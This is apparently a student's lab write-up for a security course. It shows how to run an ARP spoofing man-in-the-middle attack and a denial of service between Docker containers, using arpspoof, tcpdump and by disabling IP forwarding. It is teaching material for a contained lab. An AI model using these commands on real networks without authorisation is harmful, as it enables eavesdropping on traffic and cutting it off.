# Lab 1: Man-in-the-middle attack (ARP spoofing)

## Cilj zadatka:

Execute a man in the middle (MitM) and a denial of service (DoS) attack using vulnerability of the ARP protocol. We will demonstrate it by using 3 virtual docker computers (two victims: station-1 and station-2 and one attacker: evil-station)

### ARP (Address Resolution Protocol) Spoofing

By spoofing the reply to an ARP request not meant for that member of the network a malicious user can ruin the integrity of the network

![Untitled](Lab%201%20Man-in-the-middle%20attack%20(ARP%20spoofing)%20888ff39d3d1d4066b0cc9b30c5e91e47/Untitled.png)

### Steps:

1. Clone the repository with:

```bash
git clone https://github.com/mcagalj/SRP-2022-23
```

![Files in the cloned repository](Lab%201%20Man-in-the-middle%20attack%20(ARP%20spoofing)%20888ff39d3d1d4066b0cc9b30c5e91e47/Untitled%201.png)

Files in the cloned repository

1. Go to the arp-spoofing folder which has the [start.sh](http://start.sh) and [stop.sh](http://stop.sh) scripts

```bash
cd SRP-2022-23/arp-spoofing/
```

![Files in the arp-spoofing folder](Lab%201%20Man-in-the-middle%20attack%20(ARP%20spoofing)%20888ff39d3d1d4066b0cc9b30c5e91e47/Untitled%202.png)

Files in the arp-spoofing folder

1. Open a Windows Subsystem for Linux (Installation might be required first)
2. We can now run the .sh scripts

```bash
./start.sh
```

![Code of the [start.sh](http://start.sh) script](Lab%201%20Man-in-the-middle%20attack%20(ARP%20spoofing)%20888ff39d3d1d4066b0cc9b30c5e91e47/Untitled%203.png)

Code of the [start.sh](http://start.sh) script

1. Open bash in container station-1

```bash
docker exec -it station-1 bash
```

1. (Optional) Ping station-2 to see if they can see each other

```bash
ping station-2
```

1. Split the terminal and open bash in the container station-2

```bash
docker exec -it station-2 bash
```

1. Use the netcat command to connect station-1 and station-2

```bash
netcat -l 8080
```

```bash
netcat station-2 8080
```

1. Split the terminal again and open bash in the evil-station container (do this twice)

```bash
docker exec -it evil-station bash
```

1. In one of the evil-station terminals start the arp spoofing attack

```bash
arpspoof -i eth0 -t station-1 station-2
```

1. In the other evil-station terminal start listening

```bash
tcpdump -qX host station-1 and not arp and not icmp
```

At this point we have successfully executed a MitM attack and now if we want to start a DoS attack we need to

1. Set the ip_forward variable to 0 with the echo command so the intercepted packets no longer get forwarded to the machine we are pretending to be

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

And that’s it! we have successfully mounted a MitM and DoS attack in our network

After we’re done we can stop our docker containers with

```bash
./stop.sh
```

![Untitled](Lab%201%20Man-in-the-middle%20attack%20(ARP%20spoofing)%20888ff39d3d1d4066b0cc9b30c5e91e47/Untitled%204.png)